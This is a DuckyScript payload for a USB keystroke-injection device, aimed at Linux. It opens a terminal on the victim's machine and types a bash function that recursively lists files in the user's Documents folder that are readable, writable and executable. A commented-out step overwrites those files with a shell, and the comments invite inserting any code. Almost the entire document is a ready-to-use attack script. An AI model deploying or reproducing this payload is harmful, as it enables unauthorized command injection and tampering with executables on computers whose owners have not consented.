REM_BLOCK
################################################
#                                              #
# Title        : Exploiting An Executable File #
# Author       : Aleff                         #
# Version      : 1.0                           #
# Category     : Execution                     #
# Target       : Linux                         #
#                                              #
################################################
END_REM

REM Requirements:
REM     - Nothing, it is Plug-And-Play but you can change it as you want.

EXTENSION DETECT_READY
    REM VERSION 1.1
    REM AUTHOR: Korben

    REM_BLOCK DOCUMENTATION
        USAGE:
            Extension runs inline (here)
            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
            boot delay

        TARGETS:
            Any system that reflects CAPSLOCK will detect minimum required delay
            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
    END_REM

    REM CONFIGURATION:
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120

    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

CTRL-ALT t
DELAY 2000

REM #### Script ####
STRINGLN
  function search_file {
    for file in "$1"/*; do
      if [[ -d "$file" ]]; then
        search_file "$file";
      elif [[ -f "$file" && -r "$file" && -w "$file" && -x "$file" ]]; then
        echo "File Found: $file";
        # You can put whatever you want into the executable file
        # echo "/bin/sh" > "$file"
      fi
    done
  }
  USER=$(whoami);
  # You can choose whatever folder you want, the script is recursive.
  DIR=/home/$USER/Documents;
  search_file "$DIR";
END_STRING
ENTER